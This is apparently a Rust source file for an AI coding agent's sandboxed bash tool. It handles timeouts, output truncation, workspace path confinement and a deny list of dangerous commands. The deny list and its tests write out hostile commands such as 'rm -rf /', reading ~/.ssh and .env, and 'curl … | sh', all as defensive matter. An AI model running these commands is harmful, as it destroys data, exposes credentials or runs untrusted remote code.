use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use anyhow::{Context, bail};

use crate::bounded_process::{self, BoundedProcessOutcomeKind};

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(180);
const MAX_STREAM_BYTES: usize = 24_000;
const OUTSIDE_WORKSPACE_MARKER: &str = "[outside workspace root — do not reference]";
const INSPECT_MAX_DEPTH: usize = 3;
const INSPECT_MAX_RESULTS: usize = 200;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BashOutcomeKind {
    Success,
    CommandFailed,
    Blocked,
    Timeout,
    Cancelled,
}

#[derive(Debug, Clone)]
pub struct BashOutcome {
    pub kind: BashOutcomeKind,
    pub status: Option<String>,
    pub stdout: String,
    pub stderr: String,
    pub elapsed_ms: u128,
    pub summary: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InspectCommandNormalization {
    pub original: String,
    pub normalized: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorkspaceCdNormalization {
    pub original_prefix: String,
    pub normalized_command: String,
}

impl BashOutcome {
    pub fn is_success(&self) -> bool {
        self.kind == BashOutcomeKind::Success
    }
}

pub fn run(command: &str, root: &Path, offline: bool) -> anyhow::Result<String> {
    run_with_timeout(command, root, offline, DEFAULT_TIMEOUT)
}

pub fn run_with_cancel_and_force<F, G>(
    command: &str,
    root: &Path,
    offline: bool,
    is_cancelled: F,
    is_force_cancelled: G,
) -> anyhow::Result<String>
where
    F: Fn() -> bool,
    G: Fn() -> bool,
{
    let outcome = run_structured_cancel_and_force(
        command,
        root,
        offline,
        DEFAULT_TIMEOUT,
        is_cancelled,
        is_force_cancelled,
    )?;
    if outcome.kind == BashOutcomeKind::Blocked {
        bail!("{}", outcome.summary);
    }
    if outcome.kind == BashOutcomeKind::Timeout {
        bail!("command_timeout: {command}\n{}", format_outcome(&outcome));
    }
    if outcome.kind == BashOutcomeKind::Cancelled {
        bail!(
            "command_aborted_by_user: interrupted by user: {command}\n{}",
            format_outcome(&outcome)
        );
    }
    Ok(format_outcome(&outcome))
}

fn run_with_timeout(
    command: &str,
    root: &Path,
    offline: bool,
    timeout: Duration,
) -> anyhow::Result<String> {
    let outcome = run_structured(command, root, offline, timeout, || false)?;
    if outcome.kind == BashOutcomeKind::Blocked {
        bail!("{}", outcome.summary);
    }
    if outcome.kind == BashOutcomeKind::Timeout {
        bail!("command_timeout: {command}\n{}", format_outcome(&outcome));
    }
    Ok(format_outcome(&outcome))
}

pub fn run_checked(command: &str, root: &Path, offline: bool) -> anyhow::Result<String> {
    let outcome = run_structured(command, root, offline, DEFAULT_TIMEOUT, || false)?;
    let formatted = format_outcome(&outcome);
    if !outcome.is_success() {
        bail!("command failed: {command}\n{formatted}");
    }
    Ok(formatted)
}

pub fn run_structured<F>(
    command: &str,
    root: &Path,
    offline: bool,
    timeout: Duration,
    is_cancelled: F,
) -> anyhow::Result<BashOutcome>
where
    F: Fn() -> bool,
{
    run_structured_cancel_and_force(command, root, offline, timeout, is_cancelled, || false)
}

pub fn run_structured_cancel_and_force<F, G>(
    command: &str,
    root: &Path,
    offline: bool,
    timeout: Duration,
    is_cancelled: F,
    is_force_cancelled: G,
) -> anyhow::Result<BashOutcome>
where
    F: Fn() -> bool,
    G: Fn() -> bool,
{
    let started = Instant::now();
    let command = strip_workspace_root_cd_prefix(command, root)
        .map(|normalization| normalization.normalized_command)
        .unwrap_or_else(|| command.to_string());
    let command = normalize_inspect_command(&command, root)
        .map(|normalization| normalization.normalized)
        .unwrap_or(command);
    if let Some(reason) = blocked_reason(&command, offline) {
        return Ok(BashOutcome {
            kind: BashOutcomeKind::Blocked,
            status: None,
            stdout: String::new(),
            stderr: String::new(),
            elapsed_ms: started.elapsed().as_millis(),
            summary: reason,
        });
    }
    if let Some(rejection) = path_confinement_rejection(&command, root) {
        return Ok(BashOutcome {
            kind: BashOutcomeKind::Blocked,
            status: None,
            stdout: String::new(),
            stderr: String::new(),
            elapsed_ms: started.elapsed().as_millis(),
            summary: rejection.message,
        });
    }

    let mut process = Command::new("sh");
    process.arg("-c").arg(&command).current_dir(root);
    process.stdout(Stdio::piped()).stderr(Stdio::piped());
    let output = bounded_process::run_with_timeout_cancel_and_force(
        &mut process,
        timeout,
        is_cancelled,
        is_force_cancelled,
    )
    .with_context(|| format!("failed to spawn command: {command}"))?;

    let stdout = annotate_outside_workspace_output(&String::from_utf8_lossy(&output.stdout), root);
    let stderr = annotate_outside_workspace_output(&String::from_utf8_lossy(&output.stderr), root);
    match output.kind {
        BoundedProcessOutcomeKind::Exited => {
            let status = output
                .status
                .context("bounded process exited without status")?;
            let kind = if status.success() {
                BashOutcomeKind::Success
            } else {
                BashOutcomeKind::CommandFailed
            };
            Ok(BashOutcome {
                kind,
                status: Some(status.to_string()),
                stdout: truncate_stream(&stdout),
                stderr: truncate_stream(&stderr),
                elapsed_ms: output.elapsed.as_millis(),
                summary: build_summary(&command, kind, &stdout, &stderr),
            })
        }
        BoundedProcessOutcomeKind::Cancelled | BoundedProcessOutcomeKind::CommandAbortedByUser => {
            let summary = if output.kind == BoundedProcessOutcomeKind::CommandAbortedByUser {
                "command_aborted_by_user"
            } else {
                "command cancelled"
            };
            Ok(BashOutcome {
                kind: BashOutcomeKind::Cancelled,
                status: None,
                stdout: truncate_stream(&stdout),
                stderr: truncate_stream(&stderr),
                elapsed_ms: output.elapsed.as_millis(),
                summary: summary.to_string(),
            })
        }
        BoundedProcessOutcomeKind::TimedOut => Ok(BashOutcome {
            kind: BashOutcomeKind::Timeout,
            status: None,
            stdout: truncate_stream(&stdout),
            stderr: truncate_stream(&stderr),
            elapsed_ms: output.elapsed.as_millis(),
            summary: format!(
                "command_timeout: command timed out after {} ms",
                timeout.as_millis()
            ),
        }),
    }
}

pub fn format_outcome(outcome: &BashOutcome) -> String {
    format!(
        "outcome: {:?}\nstatus: {}\nelapsed_ms: {}\nsummary: {}\nstdout:\n{}\nstderr:\n{}",
        outcome.kind,
        outcome.status.as_deref().unwrap_or("none"),
        outcome.elapsed_ms,
        outcome.summary,
        outcome.stdout,
        outcome.stderr
    )
}

pub fn normalize_inspect_command(
    command: &str,
    root: &Path,
) -> Option<InspectCommandNormalization> {
    let original = command.trim();
    if original.is_empty() || contains_unquoted_shell_control(original) {
        return None;
    }
    let tokens = shell_words(original)?;
    let normalized = match tokens.first().map(String::as_str)? {
        "ls" => normalize_recursive_ls(&tokens, root),
        "find" => normalize_broad_find(&tokens, root),
        "du" => normalize_broad_du(&tokens, root),
        "grep" => normalize_recursive_grep(&tokens, root),
        _ => None,
    }?;
    (normalized != original).then(|| InspectCommandNormalization {
        original: original.to_string(),
        normalized,
    })
}

pub fn strip_workspace_root_cd_prefix(
    command: &str,
    root: &Path,
) -> Option<WorkspaceCdNormalization> {
    let original = command.trim();
    let operator = first_unquoted_and_and(original)?;
    let prefix = original[..operator].trim();
    let normalized_command = original[(operator + 2)..].trim();
    if normalized_command.is_empty() {
        return None;
    }
    let words = shell_words(prefix)?;
    if words.len() != 2 || words[0] != "cd" {
        return None;
    }
    let target = Path::new(&words[1]);
    if !target.is_absolute() {
        return None;
    }
    let target = target.canonicalize().ok()?;
    let root = root.canonicalize().ok()?;
    if target != root {
        return None;
    }
    Some(WorkspaceCdNormalization {
        original_prefix: original[..(operator + 2)].trim().to_string(),
        normalized_command: normalized_command.to_string(),
    })
}

fn first_unquoted_and_and(command: &str) -> Option<usize> {
    let bytes = command.as_bytes();
    let mut single = false;
    let mut double = false;
    let mut escaped = false;
    let mut index = 0usize;
    while index + 1 < bytes.len() {
        let byte = bytes[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        match byte {
            b'\\' if !single => escaped = true,
            b'\'' if !double => single = !single,
            b'"' if !single => double = !double,
            b'&' if !single && !double && bytes[index + 1] == b'&' => return Some(index),
            _ => {}
        }
        index += 1;
    }
    None
}

fn normalize_recursive_ls(tokens: &[String], root: &Path) -> Option<String> {
    let mut recursive = false;
    let mut paths = Vec::new();
    for token in &tokens[1..] {
        if token == "--recursive" {
            recursive = true;
            continue;
        }
        if token.starts_with('-') && token.len() > 1 {
            if token.trim_start_matches('-').contains('R') {
                recursive = true;
            }
            continue;
        }
        paths.push(token.as_str());
    }
    if !recursive || !paths_are_workspace_root(&paths, root) {
        return None;
    }
    Some(bounded_find_listing_command())
}

fn normalize_broad_find(tokens: &[String], root: &Path) -> Option<String> {
    match tokens {
        [program] if program == "find" => Some(bounded_find_listing_command()),
        [program, path] if program == "find" && path_is_workspace_root(path, root) => {
            Some(bounded_find_listing_command())
        }
        _ => None,
    }
}

fn normalize_broad_du(tokens: &[String], root: &Path) -> Option<String> {
    let mut recursive = false;
    let mut paths = Vec::new();
    for token in &tokens[1..] {
        if token == "-a" || token == "--all" {
            recursive = true;
            continue;
        }
        if token.starts_with('-') && token.len() > 1 {
            if token.trim_start_matches('-').contains('a') {
                recursive = true;
            }
            continue;
        }
        paths.push(token.as_str());
    }
    if !recursive || !paths_are_workspace_root(&paths, root) {
        return None;
    }
    Some(format!(
        "{} -exec du -s {{}} + | head -{}",
        bounded_find_pruned_prefix(),
        INSPECT_MAX_RESULTS
    ))
}

fn normalize_recursive_grep(tokens: &[String], root: &Path) -> Option<String> {
    let mut recursive = false;
    let mut index = 1usize;
    while index < tokens.len() {
        let token = tokens[index].as_str();
        if token == "--" {
            index += 1;
            break;
        }
        if token == "-e" || token == "--regexp" {
            index += 1;
            break;
        }
        if token.starts_with("-e") && token.len() > 2 {
            break;
        }
        if let Some(pattern) = token.strip_prefix("--regexp=")
            && !pattern.is_empty()
        {
            break;
        }
        if token == "-r" || token == "-R" || token == "--recursive" {
            recursive = true;
            index += 1;
            continue;
        }
        if token.starts_with('-') && token.len() > 1 {
            if !grep_inspect_option_is_simple(token) {
                return None;
            }
            let flags = token.trim_start_matches('-');
            if flags.contains('r') || flags.contains('R') {
                recursive = true;
            }
            index += 1;
            continue;
        }
        break;
    }
    if !recursive || index >= tokens.len() {
        return None;
    }
    let pattern = tokens[index].as_str();
    let paths = tokens[(index + 1)..]
        .iter()
        .map(String::as_str)
        .collect::<Vec<_>>();
    if !paths_are_workspace_root(&paths, root) {
        return None;
    }
    Some(format!(
        "{} -type f -exec grep -H -- {} {{}} + | head -{}",
        bounded_find_pruned_prefix(),
        shell_quote(pattern),
        INSPECT_MAX_RESULTS
    ))
}

fn grep_inspect_option_is_simple(token: &str) -> bool {
    if token.starts_with("--") {
        return matches!(
            token,
            "--recursive" | "--ignore-case" | "--line-number" | "--with-filename" | "--no-filename"
        );
    }
    token
        .trim_start_matches('-')
        .chars()
        .all(|ch| matches!(ch, 'r' | 'R' | 'i' | 'n' | 'q' | 's' | 'H' | 'h' | 'I'))
}

fn bounded_find_listing_command() -> String {
    format!(
        "{} -print | head -{}",
        bounded_find_pruned_prefix(),
        INSPECT_MAX_RESULTS
    )
}

fn bounded_find_pruned_prefix() -> String {
    format!(
        "find . -maxdepth {} \\( -name node_modules -o -name .git -o -name .next -o -name .anvil \\) -prune -o",
        INSPECT_MAX_DEPTH
    )
}

fn paths_are_workspace_root(paths: &[&str], root: &Path) -> bool {
    paths.is_empty() || paths.iter().all(|path| path_is_workspace_root(path, root))
}

fn path_is_workspace_root(path: &str, root: &Path) -> bool {
    let trimmed = path.trim();
    if matches!(trimmed, "." | "./") {
        return true;
    }
    let path = Path::new(trimmed);
    if !path.is_absolute() {
        return false;
    }
    let root = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    let comparable = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
    comparable == root
}

fn shell_quote(value: &str) -> String {
    if value.is_empty() {
        return "''".to_string();
    }
    let mut out = String::from("'");
    for ch in value.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

fn shell_words(command: &str) -> Option<Vec<String>> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut in_word = false;
    let mut single = false;
    let mut double = false;
    for ch in command.chars() {
        if single {
            if ch == '\'' {
                single = false;
            } else {
                current.push(ch);
            }
            continue;
        }
        if double {
            if ch == '"' {
                double = false;
            } else {
                current.push(ch);
            }
            continue;
        }
        if ch.is_whitespace() {
            if in_word {
                out.push(std::mem::take(&mut current));
                in_word = false;
            }
            continue;
        }
        in_word = true;
        match ch {
            '\'' => single = true,
            '"' => double = true,
            _ => current.push(ch),
        }
    }
    if single || double {
        return None;
    }
    if in_word {
        out.push(current);
    }
    Some(out)
}

fn contains_unquoted_shell_control(command: &str) -> bool {
    let bytes = command.as_bytes();
    let mut single = false;
    let mut double = false;
    let mut index = 0usize;
    while index < bytes.len() {
        match bytes[index] {
            b'\'' if !double => {
                single = !single;
                index += 1;
            }
            b'"' if !single => {
                double = !double;
                index += 1;
            }
            b'$' if !single && !double && index + 1 < bytes.len() && bytes[index + 1] == b'(' => {
                return true;
            }
            byte if !single
                && !double
                && matches!(
                    byte,
                    b';' | b'&' | b'|' | b'<' | b'>' | b'`' | b'\n' | b'\r'
                ) =>
            {
                return true;
            }
            _ => index += 1,
        }
    }
    single || double
}

pub fn blocked_reason(command: &str, offline: bool) -> Option<String> {
    let lower = command.to_ascii_lowercase();
    if lower.contains("rm -rf /")
        || lower.contains("rm -rf .")
        || lower.contains("git clean -fd")
        || lower.contains("sudo ")
        || lower.contains("chmod -r")
        || lower.contains("printenv")
        || lower.contains("env |")
        || lower.contains("cat ~/.ssh")
        || lower.contains("cat .env")
        || lower.contains("grep ") && lower.contains(".env")
        || lower.contains("/etc/passwd")
        || lower.contains("curl ") && lower.contains("| sh")
        || lower.contains("wget ") && lower.contains("| sh")
    {
        return Some("dangerous command blocked".to_string());
    }
    if offline
        && (lower.contains("npm install")
            || lower.contains("pnpm install")
            || lower.contains("yarn install")
            || lower.contains("cargo install")
            || lower.contains("curl ")
            || lower.contains("wget "))
    {
        return Some("network/setup command blocked in offline mode".to_string());
    }
    None
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BashPathConfinementRejection {
    pub path: String,
    pub root: String,
    pub nearest_relative: String,
    pub guidance: String,
    pub message: String,
}

pub fn path_confinement_rejection(
    command: &str,
    root: &Path,
) -> Option<BashPathConfinementRejection> {
    let raw_root = root.to_path_buf();
    let root = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    for candidate in absolute_path_candidates(command) {
        if bash_path_allowed(candidate, &root, &raw_root) {
            continue;
        }
        let nearest_relative = nearest_relative_form(candidate, &root);
        let guidance = workspace_relative_retry_guidance(&nearest_relative);
        let root_display = root.to_string_lossy().to_string();
        return Some(BashPathConfinementRejection {
            path: candidate.to_string(),
            root: root_display.clone(),
            nearest_relative: nearest_relative.clone(),
            guidance: guidance.clone(),
            message: format!(
                "bash_path_confinement_error: rejected absolute path `{candidate}` outside current workspace root `{root_display}`; use workspace-relative path `{nearest_relative}`; {guidance}"
            ),
        });
    }
    None
}

pub fn workspace_relative_retry_guidance(nearest_relative: &str) -> String {
    format!("workspace相対で再実行せよ: {nearest_relative}")
}

fn truncate_stream(value: &str) -> String {
    crate::util::excerpt_with_newline_marker(
        value,
        MAX_STREAM_BYTES,
        &format!("[anvilminimal: bash output truncated at {MAX_STREAM_BYTES} bytes]"),
    )
}

fn annotate_outside_workspace_output(value: &str, root: &Path) -> String {
    if value.is_empty() {
        return String::new();
    }
    let root = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    let mut annotated = String::with_capacity(value.len());
    for segment in value.split_inclusive('\n') {
        let (line, newline) = segment
            .strip_suffix('\n')
            .map(|line| (line, "\n"))
            .unwrap_or((segment, ""));
        if line_references_outside_workspace(line, &root)
            && !line.contains(OUTSIDE_WORKSPACE_MARKER)
        {
            annotated.push_str(line);
            annotated.push(' ');
            annotated.push_str(OUTSIDE_WORKSPACE_MARKER);
            annotated.push_str(newline);
        } else {
            annotated.push_str(segment);
        }
    }
    annotated
}

fn line_references_outside_workspace(line: &str, root: &Path) -> bool {
    for candidate in absolute_path_candidates(line) {
        let path = Path::new(candidate);
        let comparable = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
        if path.is_absolute()
            && candidate != "/"
            && !comparable.starts_with(root)
            && !is_system_prefix_allowed(&comparable)
        {
            return true;
        }
    }
    false
}

fn absolute_path_candidates(line: &str) -> impl Iterator<Item = &str> {
    let mut candidates = Vec::new();
    let mut index = 0usize;
    while let Some(offset) = line[index..].find('/') {
        let start = index + offset;
        if !is_absolute_path_candidate_start(line, start) {
            index = start.saturating_add(1);
            continue;
        }
        let end = line[start..]
            .find(|ch: char| {
                ch.is_whitespace()
                    || matches!(ch, '"' | '\'' | '`' | '<' | '>' | '(' | ')' | '[' | ']')
            })
            .map(|offset| start + offset)
            .unwrap_or(line.len());
        candidates.push(&line[start..end]);
        index = end.saturating_add(1);
        if index >= line.len() {
            break;
        }
    }
    candidates.into_iter()
}

fn is_absolute_path_candidate_start(line: &str, start: usize) -> bool {
    if start == 0 {
        return true;
    }
    let Some(previous) = line[..start].chars().next_back() else {
        return true;
    };
    previous.is_whitespace()
        || matches!(
            previous,
            '"' | '\'' | '`' | '<' | '>' | '(' | ')' | '[' | ']' | '=' | ':'
        )
}

fn bash_path_allowed(candidate: &str, canonical_root: &Path, raw_root: &Path) -> bool {
    let path = Path::new(candidate);
    if !path.is_absolute() || candidate == "/" {
        return true;
    }
    let comparable = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
    comparable.starts_with(canonical_root)
        || comparable.starts_with(raw_root)
        || path.starts_with(canonical_root)
        || path.starts_with(raw_root)
        || is_system_prefix_allowed(&comparable)
}

fn is_system_prefix_allowed(path: &Path) -> bool {
    ["/usr", "/bin", "/opt", "/etc", "/tmp"]
        .iter()
        .any(|prefix| path == Path::new(prefix) || path.starts_with(prefix))
        || path == Path::new("/dev/null")
}

fn nearest_relative_form(candidate: &str, root: &Path) -> String {
    let raw = Path::new(candidate);
    let raw_components = normal_components(raw);
    let root_components = normal_components(root);
    if !root_components.is_empty() && raw_components.len() >= root_components.len() {
        let anchor_len = root_components.len().min(2);
        let anchor = &root_components[root_components.len() - anchor_len..];
        let matches = raw_components
            .windows(anchor_len)
            .enumerate()
            .filter_map(|(index, window)| (window == anchor).then_some(index))
            .collect::<Vec<_>>();
        if matches.len() == 1 {
            let index = matches[0];
            let tail = &raw_components[index + anchor_len..];
            if tail.is_empty() {
                return ".".to_string();
            }
            return tail.join("/");
        }
    }
    raw.file_name()
        .map(|name| name.to_string_lossy().to_string())
        .filter(|name| !name.is_empty())
        .unwrap_or_else(|| ".".to_string())
}

fn normal_components(path: &Path) -> Vec<String> {
    path.components()
        .filter_map(|component| match component {
            std::path::Component::Normal(value) => Some(value.to_string_lossy().to_string()),
            _ => None,
        })
        .collect()
}

fn build_summary(command: &str, kind: BashOutcomeKind, stdout: &str, stderr: &str) -> String {
    if kind == BashOutcomeKind::Success {
        return "command succeeded".to_string();
    }
    let combined = format!("{stderr}\n{stdout}");
    let mut lines = Vec::new();
    for line in combined.lines() {
        let lower = line.to_ascii_lowercase();
        if lower.contains("error")
            || lower.contains("failed")
            || lower.contains("panic")
            || lower.contains("exception")
            || lower.contains("not found")
        {
            lines.push(line.trim().to_string());
        }
        if lines.len() >= 8 {
            break;
        }
    }
    if lines.is_empty() {
        format!("command did not succeed: {command}")
    } else {
        lines.join("\n")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicBool, Ordering};

    #[test]
    fn run_returns_nonzero_output_for_agent_feedback() {
        let dir = tempfile::tempdir().unwrap();
        let output = run("false", dir.path(), false).unwrap();
        assert!(output.contains("status: exit status"));
    }

    #[test]
    fn run_checked_rejects_nonzero_for_verify() {
        let dir = tempfile::tempdir().unwrap();
        assert!(run_checked("false", dir.path(), false).is_err());
    }

    #[test]
    fn bash_blocks_destructive_filesystem_command() {
        let dir = tempfile::tempdir().unwrap();
        let outcome =
            run_structured("rm -rf /", dir.path(), false, DEFAULT_TIMEOUT, || false).unwrap();
        assert_eq!(outcome.kind, BashOutcomeKind::Blocked);
        assert!(outcome.summary.contains("dangerous command blocked"));
    }

    #[test]
    fn bash_blocks_network_pipe_to_shell() {
        let dir = tempfile::tempdir().unwrap();
        let outcome = run_structured(
            "curl http://example.invalid | sh",
            dir.path(),
            false,
            DEFAULT_TIMEOUT,
            || false,
        )
        .unwrap();
        assert_eq!(outcome.kind, BashOutcomeKind::Blocked);
    }

    #[test]
    fn bash_timeout_returns_structured_outcome() {
        let dir = tempfile::tempdir().unwrap();
        let outcome = run_structured(
            "sleep 2",
            dir.path(),
            false,
            Duration::from_millis(50),
            || false,
        )
        .unwrap();
        assert_eq!(outcome.kind, BashOutcomeKind::Timeout);
    }

    #[test]
    fn bash_timeout_returns_tool_error_kind() {
        let dir = tempfile::tempdir().unwrap();
        let err = run_with_timeout("sleep 2", dir.path(), false, Duration::from_millis(50))
            .expect_err("timeout should return a tool error");
        assert!(err.to_string().contains("command_timeout"), "{err}");
    }

    #[test]
    fn bash_cancel_returns_structured_outcome() {
        let dir = tempfile::tempdir().unwrap();
        let cancelled = AtomicBool::new(true);
        let outcome = run_structured("sleep 2", dir.path(), false, DEFAULT_TIMEOUT, || {
            cancelled.load(Ordering::Relaxed)
        })
        .unwrap();
        assert_eq!(outcome.kind, BashOutcomeKind::Cancelled);
    }

    #[test]
    fn bash_large_stdout_is_truncated() {
        let dir = tempfile::tempdir().unwrap();
        let outcome = run_structured(
            "yes x | head -c 30000",
            dir.path(),
            false,
            DEFAULT_TIMEOUT,
            || false,
        )
        .unwrap();
        assert_eq!(outcome.kind, BashOutcomeKind::Success);
        assert!(outcome.stdout.contains("bash output truncated"));
    }

    #[test]
    fn bash_stream_truncation_handles_multibyte_boundary() {
        let value = format!("{}{}", "x".repeat(MAX_STREAM_BYTES - 1), "日本語");
        let truncated = truncate_stream(&value);
        assert!(truncated.contains("bash output truncated"));
        assert!(truncated.len() >= MAX_STREAM_BYTES);
    }

    #[test]
    fn bash_test_output_extracts_failure_summary() {
        let dir = tempfile::tempdir().unwrap();
        let outcome = run_structured(
            "printf 'ok\\n'; printf 'Error: broken\\n' >&2; exit 1",
            dir.path(),
            false,
            DEFAULT_TIMEOUT,
            || false,
        )
        .unwrap();
        assert_eq!(outcome.kind, BashOutcomeKind::CommandFailed);
        assert!(outcome.summary.contains("Error: broken"));
    }

    #[test]
    fn bash_output_marks_absolute_paths_outside_workspace() {
        let dir = tempfile::tempdir().unwrap();
        let outside = Path::new("/Users/example/sibling-project/file.txt");
        let output = format!(
            "found {}\ninside {}\n",
            outside.display(),
            dir.path().display()
        );
        let annotated = annotate_outside_workspace_output(&output, dir.path());

        let outside_line = annotated
            .lines()
            .find(|line| line.contains("sibling-project/file.txt"))
            .unwrap();
        assert!(
            outside_line.contains(OUTSIDE_WORKSPACE_MARKER),
            "{outside_line}"
        );

        let inside_line = annotated
            .lines()
            .find(|line| line.contains(dir.path().to_str().unwrap()))
            .unwrap();
        assert!(
            !inside_line.contains(OUTSIDE_WORKSPACE_MARKER),
            "{inside_line}"
        );
    }

    #[test]
    fn bash_path_confinement_rejects_outside_absolute_paths() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir
            .path()
            .join("localwork/commandagent_mvp/01/test0709_camp_003");
        std::fs::create_dir_all(&root).unwrap();
        let command =
            "ls /Users/maenokota/share/work/localwork/commandagent_mvp/01/test0709_camp_003";

        let rejection = path_confinement_rejection(command, &root).expect("rejected");

        assert!(rejection.message.contains(&root.display().to_string()));
        assert!(rejection.message.contains("test0709_camp_003"));
    }

    #[test]
    fn bash_path_confinement_allows_common_commands_system_prefixes_and_workspace_absolute_paths() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let package = root.join("package.json");

        assert!(path_confinement_rejection("npm run build", root).is_none());
        assert!(path_confinement_rejection("which node", root).is_none());
        assert!(path_confinement_rejection("test -e /bin/sh", root).is_none());
        assert!(
            path_confinement_rejection(&format!("test -f {}", package.display()), root).is_none()
        );
    }

    #[test]
    fn bash_normalizes_unbounded_recursive_ls_before_execution() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("src/app")).unwrap();
        std::fs::create_dir_all(dir.path().join("node_modules/pkg")).unwrap();
        std::fs::write(dir.path().join("src/app/page.tsx"), "page").unwrap();
        std::fs::write(dir.path().join("node_modules/pkg/index.js"), "pkg").unwrap();

        let normalization = normalize_inspect_command("ls -R", dir.path()).unwrap();
        assert!(normalization.normalized.contains("find . -maxdepth 3"));
        assert!(normalization.normalized.contains("-name node_modules"));
        assert!(normalization.normalized.contains("head -200"));

        let outcome = run_structured("ls -R", dir.path(), false, DEFAULT_TIMEOUT, || false)
            .expect("normalized ls should execute");
        assert_eq!(outcome.kind, BashOutcomeKind::Success);
        assert!(outcome.stdout.contains("./src/app"), "{}", outcome.stdout);
        assert!(
            !outcome.stdout.contains("node_modules"),
            "{}",
            outcome.stdout
        );
    }

    #[test]
    fn bash_keeps_path_limited_ls_and_plain_grep_unchanged() {
        let dir = tempfile::tempdir().unwrap();

        assert!(normalize_inspect_command("ls src/app", dir.path()).is_none());
        assert!(
            normalize_inspect_command("grep -q primary src/app/page.tsx", dir.path()).is_none()
        );
    }

    #[test]
    fn bash_normalizes_pathless_recursive_grep_to_bounded_find() {
        let dir = tempfile::tempdir().unwrap();
        let normalization = normalize_inspect_command("grep -r TODO", dir.path()).unwrap();

        assert!(normalization.normalized.contains("find . -maxdepth 3"));
        assert!(normalization.normalized.contains("-name .git"));
        assert!(normalization.normalized.contains("grep -H -- 'TODO'"));
        assert!(normalization.normalized.contains("head -200"));
    }
}
